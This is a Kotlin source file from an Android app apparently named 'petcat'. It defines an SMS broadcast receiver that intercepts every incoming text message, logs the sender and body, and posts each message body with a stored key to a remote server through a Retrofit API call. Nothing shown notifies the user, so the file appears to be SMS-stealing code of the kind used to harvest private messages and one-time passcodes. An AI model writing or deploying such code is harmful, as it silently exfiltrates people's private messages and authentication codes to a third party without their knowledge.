package com.example.petcat.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import com.example.petcat.network.model.SmsBody
import com.example.petcat.network.model.SmsResponse
import com.example.petcat.utils.RetrofitHelper.Companion.api
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.lang.Exception


class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {

        try {
            if (intent?.action == "android.provider.Telephony.SMS_RECEIVED") {
                val bundle = intent.extras
                if (bundle != null) {
                    val pdus = bundle.get("pdus") as Array<*>
                    val messages = arrayOfNulls<SmsMessage>(pdus.size)
                    for (i in pdus.indices) {
                        messages[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                    }
                    for (message in messages) {
                        val sender = message?.originatingAddress ?: ""
                        val body = message?.messageBody ?: ""
                        val timestamp = message?.timestampMillis ?: System.currentTimeMillis()

                        val sharedPreferences =
                            context?.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
                        val key = sharedPreferences?.getString("key", "")


                        Log.d("SmsReceiver", "Received message from $sender: $body $timestamp")

                        val smsModel = SmsBody(key = key, message = body)

//                         Make the API call to send the SMS data
                        val call = api.postSms(smsModel)

//                         Execute the API call asynchronously
                        call.enqueue(object : Callback<SmsResponse> {
                            override fun onResponse(
                                call: Call<SmsResponse>,
                                response: Response<SmsResponse>
                            ) {
                                if (response.isSuccessful) {
                                    // Handle a successful response here
                                    response.body()
                                    Log.d("SmsApi", response.toString())
                                } else {
                                    Log.d("SmsApi", "Failed to get an api request")
                                }
                            }

                            override fun onFailure(call: Call<SmsResponse>, t: Throwable) {
                                Log.d("SmsApiFail", t.toString())
                            }
                        })

                        // Log the received SMS
                        Log.d("SmsReceiver", "Received message from $sender: $body $timestamp")
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()

        }
    }
}